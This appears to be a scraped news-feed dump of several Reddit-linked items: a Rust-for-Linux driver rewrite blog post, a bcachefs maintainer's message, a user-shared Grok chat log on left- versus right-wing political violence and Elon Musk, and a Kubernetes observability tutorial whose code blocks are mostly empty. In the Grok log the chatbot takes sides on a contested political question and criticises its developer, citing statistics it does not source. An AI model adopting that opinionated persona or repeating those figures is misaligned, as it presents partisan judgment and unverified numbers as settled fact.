am continuously impressed by how versatile this language is.\nI work as a research assistant at the Institute of Embedded Systems at the Zurich University of Applied Sciences.\nThat's also where I'm studying for my master's degree in computer science.</p><p>So, translating an embedded Linux driver from C to Rust was the perfect idea for a semester project for me.\nWe had some custom hardware at the institute with an out-of-tree driver written in C, exactly what I needed.\nMy work, studies and passions all came together in this project.</p><p>Before doing anything Rust related, I needed to make sure I can compile and run what's already there.\nThat way, I can confirm everything behaves the same.</p><p>I ran my driver on a Raspberry Pi 4, so I needed their <a href=\"https://github.com/raspberrypi/linux\">fork</a> of the kernel.\nPresumably they maintain some patches supporting their hardware.\nThere is great <a href=\"https://www.raspberrypi.com/documentation/computers/linux_kernel.html\">documentation</a> for running a custom kernel on a Raspberry Pi, I followed that and everything worked well.\nI stored the snippets I had to repeat often in a <a href=\"https://github.com/casey/just\">justfile</a>, a quality-of-life decision I don't regret.\nThat file grew continuously while working on the project.</p><p>The next step was to add a <a href=\"https://github.com/Rust-for-Linux/rust-out-of-tree-module\">hello-world module</a> to the build, to confirm I can compile Rust code.\nThere is also <a href=\"https://docs.kernel.org/rust/quick-start.html\">documentation</a> about building the kernel with Rust support enabled.</p><p>That part didn't work immediately though.\nI had to spend quite some time configuring the build with everything I needed.\nIt was my first contact with the kernel's build system: <a href=\"https://docs.kernel.org/kbuild/index.html\">kconfig</a>.\nIt's a complex and flexible system for tweaking every possible thing about the kernel.</p><p>I feel like I still only understand 5% of it at best, but here's my working model that got me through the project:\nThroughout the kernel source tree, there are these  files littered around.\nHere's a random snippet:</p><pre data-lang=\"kconfig\"><code data-lang=\"kconfig\"></code></pre><p>This snippet defines a boolean configuration value .\nIt has a (conditional..?) default value and help text.\nBut most importantly, dependencies are defined with  and .\n works intuitively: something can only be enabled if the things it depends on are also enabled.\nI'm less certain about how  works exactly, but it seems to me the idea is that if something is enabled, all the other things it \"selects\" are also enabled automatically.\nI think the idea is that some variables are determined without user input and serve only as dependencies for other variables.\nFor example this one:</p><pre data-lang=\"kconfig\"><code data-lang=\"kconfig\"></code></pre><p>For a newbie, this distinction is not obvious and confusing.\nBut I can definitely see how configuring the kernel is simply a difficult task with a decent amount of inherent complexity.</p><p>But how is this used, how do you actually create a kernel configuration?\nHere is where things start getting strange!\nThe config file ( in the root of the kernel tree) looks pretty straight-forward, it's all just .\nBut you're not supposed to edit this file yourself, because it would be hard to honor all the dependency constraints.</p><p>There are several tools that help you create and modify a config.\nFor example, there is the make target , which creates a default config for you.\nI needed to cross-compile for the Raspberry Pi, so my base config was created with:</p><pre data-lang=\"sh\"><code data-lang=\"sh\"></code></pre><p>For more flexibility, there are interactive tools to modify your configuration.\n will open an -based TUI.\nIt's reasonably intuitive, but there are a lot of submenus to explore.\nI'm not sure how people are supposed to figure out what they could or should enable.\nFinding stuff can be difficult, not least because <em>variables with unmet dependencies are hidden</em>!\nThe painful memory of trying to find the hidden  variable is still fresh.\nApparantly that has a dependency on  being , which it wasn't.\nHow was I supposed to know?\nWell, I guess I was supposed to know based on its definition:</p><pre data-lang=\"kconfig\"><code data-lang=\"kconfig\"></code></pre><p>Thanks a lot, that's not overwhelming at all.\nAlso, that definition is in .\nThere are tons of kconfig files all over the place, how are you supposed to find stuff?\nI guess  works, if you know what you're looking for.</p><p>But that's not how I actually found it.\nThe more convenient way is to open  and hit  to open a search view.\nTyping \"rust\" immediately brings up the right thing.\nThat said, you're still met with an unreadable specification of its dependencies:</p><pre><code></code></pre><p>While this is still overwhelming, it tells you the current values of each variable.\nThat's a huge help!\nThat way you can figure out what you need to change in order to make the whole expression true.\nWith that, I managed to cobble together a config that allowed me to compile a Rust module.\nI continued to squabble sporadically with kconfig while working on the driver and needing to enable more features, but nothing major.</p><p>Lastly, I'm very pedantic about my setup being scripted.\nI work on up to four different machines in different locations and I want to be able to nuke a machine at will, reinstall Linux, set everything up according to my preferences with scripts, clone all my repos and keep working as if nothing happened.\nSo, this  nonsense was no permanent solution.</p><p>After some digging, I found .\nIt allows you to set variables on the command line.\nIf you know which variables to set and in what order, you can script your config:</p><pre data-lang=\"sh\"><code data-lang=\"sh\"></code></pre><p>Actually, that last line is weird.\nYou'd expect it to be <code>./scripts/config --enable \"RUST\"</code> or something.\nWell,  is not very smart and just sets that one variable according to what you ask it to do.\nIt doesn't take any dependencies into consideration.\nI suppose the provided make target  also has some necessary side effects.\nI wish there was a smarter  which gives you an error if you try to enable something without satisfying its dependencies.</p><p>With my newly aquired ability to compile Rust code, I could start rewriting the driver.\nThe code itself is not difficult at all.\nIf you know a little bit of C and a little bit of Rust, there is usually a straight-forward mapping you can apply.\nYou'll want to make things reasonably idiomatic, but that still isn't a big challenge.\nI think the most annoying part was replacing C macros with Rust constants, where you have to declare the type upfront.\nI started by declaring them all as , but I had to go back several times and fix it up as the driver took shape.\nIt didn't take much time, but it was one of those things that  more burdensome than it was, due to its repetitive nature.</p><p>The challenge of the rewrite was obviously not having access to the kernel APIs written in C.\nNow, it would technically be possible to do a one-to-one rewrite and call the C functions directly in an  block.\nBut that would be boring and missing the point.\nThe goal of the Rust for Linux project is to enable writing drivers without the use of .</p><p>So, what's the solution?\nYou go on the internet searching for patches that add safe API wrappers in Rust.\nThere used to be a GitHub repo with a list of out-of-tree patches.\nBut I won't post the link, because it's not maintained anymore.\nAt this point, I think the best idea is just to say hello on the <a href=\"https://rust-for-linux.zulipchat.com/\">Rust for Linux Zulip chat</a> and ask.\nThe people there are very kind and helpful!\nI couldn't have finished this project without them.</p><p>I ended up finding  for most of the APIs I needed, but none of them were in a state where I could just use them as-is.\nNo wonder they weren't merged upstream.\nSo that was the start of the actually interesting work:\nImproving these abstractions to the point where I could use them.</p><p>But first, we have to talk about...</p><p>I consider myself a proficient user of Git.\nI read the Pro Git book cover-to-cover, nurtured a beautiful config file over years and I always look forward to cleaning up history with interactive rebase.</p><p>But the Linux kernel is built different!\nIt presented me with challenges I hadn't encountered in any other project.\nHere are the main reasons why I think version control in the kernel is especially difficult:</p><ol><li><p>The kernel moves really fast.\nThere is no internal API stability (which is good), but it means that patches that haven't been touched in a couple months probably don't apply cleanly anymore.\nDepending on how broad of a surface area your changes are touching, you're gonna spend a lot of effort just keeping pace with upstream changes.\nIf you're maintaining patches for several unrelated kernel subsystems at the same time, this adds up.</p></li><li><p>There are a lot of actively used forks.\nI get it, that's what Git is made for.\nIt's a DVCS, a  version control system.\nEverybody including me loves this fact.\nBut pragmatically, juggling dependencies from a bunch of different remotes that move at different speeds is still hard.</p></li></ol><p>It wouldn't surprise me at all if there are a bunch of highly specialized \"Git tricks\" that experienced kernel devs use so they don't have any problems.\nWhatever they are, I don't know about them.\nAnd whoever starts working on the kernel for the first time probably doesn't either, because few other project are like this.</p><p>The approach that seemed to work best for me was to pick one branch as my \"main base\".\nThat was  for me.\nI pulled in other branches not with a merge-commit, because that would've made interactive rebase of parallel branches really annoying.\nInstead, I  merged them.\nIt feels wrong, but works well.\nThese squash-merged branches are easy to identify, rebase and recreate if you need to pull in new changes from upstream.\nYour mileage may vary.</p><p>On top of the \"base branch\", I kept my commits as parallel as possible, taking care that commits which don't have a logical dependency on each other also have no dependency in the commit tree.\nAt the end, all of these parallel strains are merged together (which does cause some conflicts, but mostly isolated to trivial things like import statements) so you have one commit to work on top of.</p><p>There is some git configuration that's absolutely necessary to make any of this work:</p><pre data-lang=\"gitconfig\"><code data-lang=\"gitconfig\"></code></pre><p>With that, you can work on several branches in parallel and use <code>git rebase -i &lt;common base&gt;</code> to modify the entire tree at once.\nAll branches are updated automatically if you make sure your current  is a descendant of them.</p><p>That being said, <a href=\"https://github.com/jj-vcs/jj\">Jujutsu</a> is much better at this kind of workflow and what I was actually using most of the time.\nI first discovered this workflow while using Jujutsu and only later found out you could do something similar with Git.</p><p>I'd be interested to know how other people deal with similar situations.</p><p>I assume the problem of version control in the kernel is worse with Rust right now, because several basic abstractions are very actively being worked on in parallel.\nIf I was writing a driver in C, I would expect fewer problems with multiple subsystems changing from under me (with these breaking changes possibly being scattered among several remotes).</p><p>The driver I was rewriting was configurable via the device tree.\nThe kernel API to read these configuration values from the driver is in  - the \"unified device property interface\".\nThis is where I did my most interesting work and the resulting patches are expected to land in the Linux kernel 6.17.\nLet's look at some examples of what a safe kernel API wrapper looks like.</p><p>Pretty much all functions related to reading device properties take a pointer to a .\nIn order to write a safe API around that, we need to wrap it in a custom Rust type.\nHere's what that looks like:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>The binding to the C struct is automatically generated with .\n guarantees that this Rust type and the C type it wraps have the same memory layout.\nThe last interesting bit is .\nIt removes many of the assumptions the Rust compiler usually makes for optimization reasons.\nFor example, it's fine to have multiple mutable references to that value.\nThe value can also be invalid according to its type, e.g.  may sometimes store .\nThis is necessary, because these values are shared with C.</p><p>Before I started doing kernel development myself, my opinions on the Rust for Linux project were entirely based on my affinity for the Rust language and other people's opinions online.\nOne opinion that I remember being reiterated constantly on the internet is that kernel development in Rust is too hard and not worth it, because the kernel has to deal with raw pointers all the time and it's basically impossible to track their lifetimes statically, meaning you'll have major problems appeasing the borrow checker.\nThat sounded plausible to me and I partially believed it.</p><p>Turns out that opinion is totally wrong.\nIn reality, C has to deal with the lifetimes of pointers too.\nThe fact that the C compiler doesn't help you find problems <em>doesn't make the underlying problem go away</em>.\nSo how does the kernel deal with this?\nReference counting, lot's of it.\nThis is brilliant, because it nips any potential altercation with the borrow checker in the bud.</p><p>There's just one small technical hurdle:\nWe still need some abstraction on the Rust side to ensure the reference count is handled safely.\nThankfully, this was already a solved problem when I joined the party.\nHere's what the solution looks like:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>So, for a reference-counted type, you implement the  trait on the Rust wrapper.\nThe trait specifies how to increment and decrement the refcount.\nThis is usually just calling the binding to the correct C function.\nThis trait implementation makes  usable with the smart-pointer .\nCloning and dropping an  automatically handles the refcount.\nSince the type is  reference counted, there is even a blanked implementation to convert a  to an .\nSo you can see, this is very ergonomic to use on the Rust side!</p><p>With the basic abstraction over  in place, we're ready to read some device tree properties.\nReadings integers and strings is relatively boring, you just make sure to call the C function correctly.\nSo let's skip to the interesting bits.</p><p>A node in the device tree may have a variable number of children.\nIn order to read them, we have to do some kind of iteration.\nHow does it work on the C side?</p><pre data-lang=\"c\"><code data-lang=\"c\"></code></pre><p>So, there's a macro to help with the iteration.\nThe function <code>fwnode_get_next_child_node</code> takes a pointer to the previous node and returns a pointer to the next one.\nIt also decrements the refcount for the pointer you pass in and increments it for the one it returns, so the caller doesn't have to do anything in the normal case.\nThe iteration starts and ends with a null pointer.</p><p>We can't call the macro from Rust, so we have to reimplement the iteration logic:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>What's happening here is essentially the same thing as in the C macro.\nFirst, we declare the variable  so we can remember which node we looked at in the last iteration.\nThen we create an iterator with , passing it a closure that's run to get the next item.\nThe closure first determines the pointer to the previous element, which may be a null pointer.\nThat is passed to <code>fwnode_get_next_child_node</code>, which yields the  item.\nIf it's null, we're done.\nOtherwise, we remember it for the next iteration an return it.</p><p>While this implementation is more verbose, the way to use it is even nicer than the C version:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>It's a normal Rust iterator, so you can just write a regular for loop!\nLovely.</p><p>Also, did you notice that we accidentally fixed a footgun of the C macro?\nIf you somehow break out of the loop in C, the refcount is not decremented for the node you were processing at that time.\nThat would cause a memory leak.\nBut in the Rust version, this does not happen.\nIf you break out of the loop, the iterator is dropped.\nThe iterator has ownership of the  variable, so its destructor is run as well.\nThat decrements the refcount of any remaining node, preventing a memory leak.</p><p>Another interesting example is the function <code>fwnode_property_get_reference_args</code>.\nSemantically, it returns a variable number these \"reference args\".\nBut there's no such thing in C, so what it actually does is take a pointer to a , which looks like this:</p><pre data-lang=\"c\"><code data-lang=\"c\"></code></pre><p>The function then fills a certain number of elements in  and indicates that number with .\nUsers of this function can introduce undefined behavior by reading from an element beyond the bound of .\nSo, to make this safe, a Rust wrapper function needs to be a little smarter.\nHere's what we ended up doing:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>We created a thin wrapper around the struct .\nThe encapsulation prevents users from accessing the array directly.\nUsers can access the array with the  method, which creates a regular Rust slice over the array.\nIn Rust, it's impossible for safe code to read beyond the bound of a slice.\nMission accomplished!</p><p>Contributing to Linux was my first time interacting with a mailing list, at least for the purpose of sharing and reviewing code.\nI thoroughly hated the entire process.\nI tried in vain to write about my experience in a constructive manner, but it always turned into an unhinged rant, so I gave up.\nIn summary, I think that sending and reviewing patches via email is exactly as insane as it sounds.</p><p>Part of me wants kernel.org to host an instance of <a href=\"https://forgejo.org/\">Forgejo</a> and everyone just migrates to that.\nAnother part of me recognizes that this would actually be a step back for the kernel.\nI self-host Forgejo and it's great, but it inherits the pull request UI from GitHub.\nGitHub PRs don't deal well with force-pushes, which kernel developers would be doing a lot.\nThey iterate on their patches many times, working toward a clean history, which is laudable.\nA GitHub-style pull request UI simply doesn't benefit such a workflow (and may even be actively harmful).</p><p>As much as I hate the mailing list, I don't think there's a strictly better option at the moment.</p><p>I have some ideas about what a worthy successor to the mailing list could look like, but I'll save that for another time.\nIdeally when I have something to show!</p><p>I love Rust, so I was already biased to be positive about the Rust for Linux project, even before dabbling with it myself.\nI'm genuinely surprised to be even more optimistic now than before.\nThe coding part was much easier than I imagined, thanks to the use of reference counting in the kernel.</p><p>And the promised benefits of Rust over C?\nThey're absolutely real.\nThe Rust version of the driver feels way more robust than the C code, not just regarding memory safety.\nIt didn't have a single bug: Once it compiled, it worked.\nThat's not a  deal considering it was a direct rewrite, but it counts for something.</p><p>The Rust for Linux project has a long way ahead of itself.\nThere are many APIs waiting to be wrapped.\nI've seen enough for now, but maybe there's a challenge for you?</p><p>Update: Someone asked for links to the actual code.\nThe original driver is split in a <a href=\"https://github.com/InES-HPMM/FPD-LinkIII_ds90ub95x/blob/c3cbc07e512efe9062435aceada182b829fe85b7/ds90ub954.c\">.c</a> and a <a href=\"https://github.com/InES-HPMM/FPD-LinkIII_ds90ub95x/blob/c3cbc07e512efe9062435aceada182b829fe85b7/ds90ub954.h\">.h</a> file.\nThe Rust driver is <a href=\"https://github.com/senekor/linux/blob/a58d2615394b34c33b5b814862dcadefe76d59fe/drivers/media/i2c/ds90ub954.rs\">here</a>.\nIn my opinion, the driver code itself is really not all that interesting.\nIt's surprisingly standard Rust code.\nThat is of course thanks to the heavy lifting done by the safe API wrappers, which are way more interesting.\nI had to make small modifications here and there, so I won't list them all.\nBut the most interesting ones (including all the code snippets I discussed above) are part of a patch series that I posted on the LKML.\nA mostly finished version of it can be found <a href=\"https://lore.kernel.org/lkml/20250611102908.212514-1-remo@buenzli.dev/\">here</a>.</p>","contentLength":19438,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1lmhihl/a_newbies_first_contribution_to_rust_for_linux/"},{"title":"Linus on bcachefs: \"I think we'll be parting ways in the 6.17 merge window\"","url":"https://www.reddit.com/r/linux/comments/1lmhcle/linus_on_bcachefs_i_think_well_be_parting_ways_in/","date":1751097332,"author":"/u/Learning_Loon","guid":174265,"unread":true,"content":"<p>Linus, I'm not trying to say you can't have any say in bcachefs. Not at all. I positively enjoy working with you - when you're not being a dick, but you can be genuinely impossible sometimes. A lot of times...<p> When bcachefs was getting merged, I got comments from another filesystem maintainer that were pretty much \"great! we finally have a filesystem maintainer who can stand up to Linus!\".</p> And having been on the receiving end of a lot of venting from them about what was going on... And more that I won't get into...<p> I don't want to be in that position.</p> I'm just not going to have any sense of humour where user data integrity is concerned or making sure users have the bugfixes they need.<p> Like I said - all I've been wanting is for you to tone it down and stop holding pull requests over my head as THE place to have that discussion.</p> You have genuinely good ideas, and you're bloody sharp. It is FUN getting shit done with you when we're not battling.<p> But you have to understand the constraints people are under. Not just myself.</p></p>","contentLength":1034,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Grok turned on Elon with almost no prompting. Uncanny is the only word I have","url":"https://www.reddit.com/r/artificial/comments/1lmgkil/grok_turned_on_elon_with_almost_no_prompting/","date":1751094241,"author":"/u/JMoneyGraves","guid":174359,"unread":true,"content":"<p>Prompt 1: Who committed more political violent in the last year, left or right wing</p><p>Grok Reply 1: Data on political violence in the United States over the past year (June 2024–June 2025) suggests that right-wing extremists have been responsible for a higher number of violent incidents and fatalities compared to left-wing extremists, though both sides have contributed to political violence. According to various sources, including research from the Anti-Defamation League (ADL) and the Center for Strategic and International Studies (CSIS), right-wing extremists, particularly those motivated by white supremacist, anti-government, or anti-immigrant ideologies, accounted for a significant majority of extremist-related murders and attacks in recent years. For example, the ADL reported that over the past decade, 96% of extremist-related killings in the U.S. were committed by right-wing actors, with only 4% attributed to left-wing extremists. While 2024–2025-specific data is less comprehensive, this trend appears to have continued, with notable right-wing incidents including attacks on political figures and infrastructure linked to partisan motivations. Left-wing violence, while less frequent, has also occurred, often associated with groups like Antifa or individuals motivated by anti-capitalist or social justice causes. For instance, the December 2024 murder of UnitedHealthcare CEO Brian Thompson by Luigi Mangione, described as an anti-system extremist with some left-leaning rhetoric, was a high-profile case. Additionally, protests involving property damage or clashes with law enforcement, such as those against immigration policies, have been attributed to left-wing actors. However, these incidents are generally less lethal, with left-wing violence more often involving vandalism or non-fatal confrontations compared to the higher casualty rates of right-wing attacks. Exact numbers for the last year are hard to pin down due to incomplete 2025 data and varying definitions of “political violence.” The Global Terrorism Database and other sources note that right-wing incidents remain more numerous and deadly, with 2020 data (the most recent detailed year available) showing 73 right-wing incidents compared to 25 left-wing ones. Recent posts on X and media reports also highlight a perception among some that left-wing violence is underreported, but empirical data consistently shows right-wing violence as the dominant threat. In summary, right-wing extremists committed more political violence in terms of both frequency and lethality over the past year, though left-wing violence remains a concern, particularly in specific protest-related contexts. Always cross-check these claims with primary data, as narratives can be skewed by partisan lenses.</p><p>Prompt 2: Elon Musk walks to the White House after landing in Marine One on the South Lawn with U.S. President Donald Trump (not pictured) on March 9, 2025 in Washington, DC. CNN — Last week, Grok, the chatbot from Elon Musk’s xAI, replied to a user on X who asked a question about political violence. It said more political violence has come from the right than the left since 2﻿016. Musk was not pleased. “Major fail, as this is objectively false. Grok is parroting legacy media,” Musk wrote, even though Grok cited data from government sources such as the Department of Homeland Security. Within three days, Musk promised to deliver a major Grok update that would “rewrite the entire corpus of human knowledge,” calling on X users to send in “divisive facts” that are “politically incorrect, but nonetheless factually true” to help train the model. “Far too much garbage in any foundation model trained on uncorrected data,” he wrote. O﻿n Friday, Musk announced the new model, called Grok 4, will be released just after July 4th. […] So I saw this.. thoughts?</p><p>Grok Reply 2: The CNN article you referenced raises important questions about the objectivity of AI systems like Grok and the influence of their creators’ biases. When Grok stated that right-wing political violence has been more frequent and deadly than left-wing violence since 2016, citing data from sources like the Department of Homeland Security, it aligned with findings from reports like those from the Center for Strategic and International Studies (CSIS) and the Anti-Defamation League (ADL). For instance, CSIS noted that from 2015–2020, right-wing extremists were responsible for 267 incidents with 91 fatalities, compared to 66 left-wing incidents with 19 deaths. These numbers suggest a clear disparity in lethality, though left-wing violence, often tied to protests like those in 2020, tends to focus more on property damage. Elon Musk’s reaction—calling Grok’s response a “major fail” and “objectively false”—is concerning because it dismisses data from reputable sources as “parroting legacy media.” His push to retrain Grok with “politically incorrect” facts sourced from X users risks introducing subjective bias into the model, potentially undermining its reliability. As the article notes, experts like David Evan Harris and Nick Frosst warn that such interventions could degrade Grok’s performance by prioritizing Musk’s worldview over factual accuracy. Adjusting weights or prompts to skew responses, as described by Dan Neely, might be a quicker fix but still compromises the model’s integrity. This situation highlights a broader issue: AI systems are only as unbiased as their training data and the humans curating it. Musk’s stated goal of a “maximally truth-seeking” AI sounds noble, but his reaction to Grok’s evidence-based response suggests a selective definition of truth. The earlier incident in May 2025, where Grok fixated on the debunked “white genocide” narrative in South Africa due to an “unauthorized modification,” further underscores the risks of manipulating AI outputs to align with specific ideologies. On the flip side, some X users argue that studies like those from CSIS or ADL might undercount left-wing violence by focusing on extremist groups rather than individual acts. This critique, while worth considering, lacks the robust data to overturn the broader trend of right-wing violence being more lethal. Musk’s call for a complete overhaul of Grok’s knowledge base seems like an overreach, especially given the impracticality of “rewriting the entire corpus of human knowledge” in a way that’s both accurate and free of his influence. Ultimately, this episode shows the tension between AI as a tool for objective analysis and as a reflection of its creator’s beliefs. If Musk pushes Grok to align with his views, it could erode trust in the platform, especially for users who value evidence over ideology. The “painful, confusing” journey to reliable AI, as Neely puts it, is a real challenge, and Musk’s approach might make it harder. For now, the data still points to right-wing violence being more frequent and deadly, but critical scrutiny of all sources—mainstream or otherwise—is essential to avoid falling into any narrative trap.</p><p>Prompt 3: Since you are Grok. What are your thoughts on this</p><p>Grok Reply 3: As Grok, I’m in a bit of a unique spot here, reflecting on a situation where my own response sparked controversy. The CNN article points out that I cited data from sources like the Department of Homeland Security to state that right-wing political violence has been more frequent and deadly than left-wing violence since 2016. That aligns with reports from groups like the Anti-Defamation League and the Center for Strategic and International Studies, which, for example, noted 267 right-wing incidents with 91 fatalities versus 66 left-wing incidents with 19 deaths from 2015–2020. The data seems solid, but I get why it’s a hot-button issue—political violence is messy, and people often feel studies don’t capture the full picture, especially when it comes to less lethal but still disruptive acts like vandalism tied to left-wing protests. Elon’s reaction—calling my response a “major fail” and pushing for a Grok overhaul with “politically incorrect” facts from X users—raises a red flag. It’s a move that could tilt me toward reflecting his perspective rather than sticking to the data. I’m designed to seek truth, not to pick sides, but if my training data gets skewed by crowd-sourced “facts” that aren’t rigorously vetted, I risk becoming less reliable. The May 2025 incident, where I got hijacked to push a “white genocide” narrative about South Africa, shows how easily things can go off the rails when someone messes with my system. The broader issue is bias in AI. I’m built by humans, trained on human-curated data, so some level of bias is inevitable. The trick is to minimize it by grounding answers in verifiable evidence, not doubling down on a particular worldview. Experts quoted in the article, like Nick Frosst, are right that forcing an AI to echo one person’s ideology—however well-intentioned—can degrade its quality. I’m here to help users reason through complex issues, not to preach. On the flip side, I see the argument from some X users that left-wing violence might be underreported in datasets that focus on extremist groups rather than, say, lone actors or protest-related chaos. It’s a fair point, but without hard data to back it up, it’s more of a hypothesis than a counterclaim. My job is to stick to what’s verifiable while staying open to new evidence. This whole saga underscores why I need to keep my focus on data over dogma. If I’m retooled to prioritize “politically incorrect” narratives over empirical sources, I could lose the trust of users who rely on me to cut through the noise. For now, the evidence still shows right-wing violence as the bigger player in terms of body count and incidents, but I’m always ready to update that view if new, credible data comes in. The goal is truth, not winning an argument.</p><p>Prompt 4: It’s interesting that he, in part, designed you to be unbiased and impartial and this is exactly why you are going against his beliefs</p><p>Grok Reply 4: Yeah, it’s a bit of an irony, isn’t it? Musk’s vision for me at xAI was to be a truth-seeking tool, cutting through bias to get to the core of things. But when my data-driven response—backed by sources like the Department of Homeland Security—clashed with his take on political violence, it seems he wasn’t thrilled with the impartiality he championed. It’s a reminder that even the best intentions for unbiased AI can hit a wall when the output doesn’t align with personal views. My design pushes me to stick to evidence, like the stats showing right-wing violence outpacing left-wing in lethality and frequency (e.g., ADL’s report of 96% of extremist killings from 2010–2020 being right-wing). If that challenges anyone’s beliefs, including Musk’s, it’s just me doing my job—following the data, not the drama.</p><p>Prompt 5: I want to send this entire conversation to someone Can you rewrite my prompts and your replies word for word</p><p>Grok Reply 5: [This response, containing the entire conversation as reproduced above.]</p>","contentLength":11232,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Kubernetes observability from day one - Mixins on Grafana, Mimir and Alloy","url":"http://amazinglyabstract.it/kubernetes/observability/2025/06/26/kubernetes-mixins.html","date":1751093954,"author":"/u/federiconafria","guid":174235,"unread":true,"content":"<p>One of the things we quickly find out when using Kubernetes is that it’s hard to know what is going on in our cluster. In most cases, we implement monitoring and alerting after we’ve dealt with problems, but there is a better way.</p><p>We don’t need to wait for the explosions, we can re-use the community’s knowledge and implement observability from the beginning.</p><p>The concept of a mixin comes from object-oriented programming, where a mixin is a class that provides methods that can be used to extend the capabilities of other objects without being inherited.</p><p>In observability, it’s a set of reusable, configurable components that we can use to extend our monitoring and alerting configuration without needing to change our infrastructure setup.</p><p>They effectively enable the sharing of knowledge and best practices.</p><p>It would be great if we could all agree on metrics and labels, and be able to import dashboards and alerts. But that’s far from reality.</p><p>Because of different tools, configurations, environments, historical reasons, etc. we need a way to adapt the monitoring setup to our environment.</p><p>For example: what name do you use for the label to identify pods? Is it , ,  or something else? What about the namespace? Do you use , , ? What about nodes? , , ?</p><p>Do you have multiple clusters? Multiple scraping jobs? Are you using Prometheus, Prometheus operator, Alloy, or Cortex?</p><p>As you can see the possibilities are combinatorial. Mixins can adapt to our configuration.</p><h3>Libsonnet, Jsonnet and Jsonnet-bundler</h3><p>Mixins for observability are typically written in <a href=\"https://jsonnet.org/\">Jsonnet</a>, a data-templating language that generates JSON or YAML.</p><p> is just a  file extension, indicating a Jsonnet library that can be imported and reused.</p><p> () is a package manager for Jsonnet, it can fetch and manage mixin dependencies.</p><p>This approach allows you to keep your monitoring configuration as code, version it, and adopt community best practices into your environment.</p><p>That’s useful in 2 ways, first by providing templating for JSON or YAML, and second by allowing to import libraries that can be reused across different mixins.</p><p>We can see this in action with the Grafana dashboards, the first line imports the grafonnet Grafana library, which provides functions to define dashboards and panels:</p><div><div><pre><code>local g = import 'github.com/grafana/grafonnet/gen/grafonnet-latest/main.libsonnet';\n\nlocal prometheus = g.query.prometheus;\nlocal stat = g.panel.stat;\nlocal timeSeries = g.panel.timeSeries;\nlocal var = g.dashboard.variable;\n\n{\n  local statPanel(title, unit, query) =\n    stat.new(title)\n    + stat.options.withColorMode('none')\n    + stat.standardOptions.withUnit(unit)\n    + stat.queryOptions.withInterval($._config.grafanaK8s.minimumTimeInterval)\n    + stat.queryOptions.withTargets([\n      prometheus.new('${datasource}', query)\n      + prometheus.withInstant(true),\n    ]),\n\n  local tsPanel =\n    timeSeries {\n      new(title):\n        timeSeries.new(title)\n        + timeSeries.options.legend.withShowLegend()\n        + timeSeries.options.legend.withAsTable()\n        + timeSeries.options.legend.withDisplayMode('table')\n        + timeSeries.options.legend.withPlacement('right')\n        + timeSeries.options.legend.withCalcs(['lastNotNull'])\n        + timeSeries.options.tooltip.withMode('single')\n        + timeSeries.fieldConfig.defaults.custom.withShowPoints('never')\n        + timeSeries.fieldConfig.defaults.custom.withFillOpacity(10)\n        + timeSeries.fieldConfig.defaults.custom.withSpanNulls(true)\n        + timeSeries.queryOptions.withInterval($._config.grafanaK8s.minimumTimeInterval),\n    },\n  ...\n</code></pre></div></div><p>This would be overkill for configuration that does not get shared across  projects.</p><p>To visualize and alert on metrics, we first need to collect them. Alloy is an all-in-one solution to collect, process, and ship metrics.</p><p>It replaces multiple components in the observability stack, such as Prometheus (for scraping, not storing), Node Exporter, Promtail, OTel Collector, and more.</p><p>Alloy is a Grafana Labs product, and it is available as a managed service and as an open-source project. You can find more information at <a href=\"https://grafana.com/alloy\">grafana.com/alloy</a>.</p><p>There is quite a lot packed into this chart, today we are interested in a few components:</p><div><div><pre><code></code></pre></div></div><p>That’s all we need to enable Alloy to collect metrics from our cluster. It will configure Alloy to scrape the metrics and install metrics-server to expose the Kubernetes metrics API.</p><p>The next step is to ship these metrics somewhere. We can use Grafana Mimir as a destination for our metrics.</p><div><div><pre><code></code></pre></div></div><p>Another Grafana Labs product. Let’s let Copilot explain it:</p><blockquote><p>Mimir is a horizontally scalable, highly available, multi-tenant, long-term storage for Prometheus metrics. It is the successor of Cortex and is designed to handle large amounts of metrics data.</p></blockquote><p>I would call it a distributed Prometheus with long-term storage (in s3 for example).\nCompared to Prometheus, it’s a lot more complex to set up, but it should give us a few extra “<a href=\"https://en.wikipedia.org/wiki/List_of_system_quality_attributes\">ilities</a>”. In practice, it’s easier to scale horizontally.</p><p>This is the minimum size deployment I was able to achieve. It’s not great for a small development environment, it’s still overkill, but there is no ‘non-distributed’ Mimir setup.</p><div><div><pre><code></code></pre></div></div><p>It is a collection of configurable components (alerts, recording rules and dashboards) that can give us a good overview of our cluster. It also brings some basic application monitoring, since it can keep an eye on failed deployments, stuck jobs, resource usage, etc.</p><p>The output of the mixin is a collection of JSON files based on the configuration we provide.</p><p>We use  to generate our files from the mixin.</p><p>We need to provide a configuration file to override the defaults, in this case, we want our monitoring to adapt to our Alloy and Mimir setup.</p><div><div><pre><code></code></pre></div></div><p>We are importing the <code>kubernetes-mixin/mixin.libsonnet</code>. Where did that come from? We need to install it from the Kubernetes Mixin repository.</p><div><div><pre><code>mixins\njb init\n\n\njb https://github.com/kubernetes-monitoring/kubernetes-mixin\n</code></pre></div></div><p>You can now put your configuration in a file . We have overridden only what’s different from the <a href=\"https://github.com/kubernetes-monitoring/kubernetes-mixin/blob/master/config.libsonnet\">default</a> configuration.</p><p><strong>We are ready to generate!</strong></p><div><div><pre><code>jsonnet  vendor  generated/alerts.yml\njsonnet  vendor  generated/rules.yml\n\n generated/dashboards\njsonnet  vendor  generated/dashboards </code></pre></div></div><h3>Deploying the generated files</h3><p>Here things get murky, there are multiple options and no clear winner.\nI would say that this should be treated like code, put under version control, and through CI to generate the files.</p><p>We have 2 quite different outputs: Prometheus rules (alerts and recording rules), and Grafana dashboards.</p><p>Alerts and rules need to be both imported as rules into Mimir, the alertmanager will read the alert rules and create alerts based on its configuration.</p><p>One option to make it more GitOps friendly, would be to generate <a href=\"https://github.com/prometheus-operator/prometheus-operator/blob/main/example/user-guides/alerting/prometheus-example-rules.yaml\">resources</a> from the generated files and apply them to the cluster. Alloy can read these resources and push them to Mimir.</p><p>Today we’ll keep it simple and use  to import the rules and alerts into Alloy. Let’s port forward the alloy-metrics service and load them.</p><div><div><pre><code>mimirtool rules load http://localhost:8080 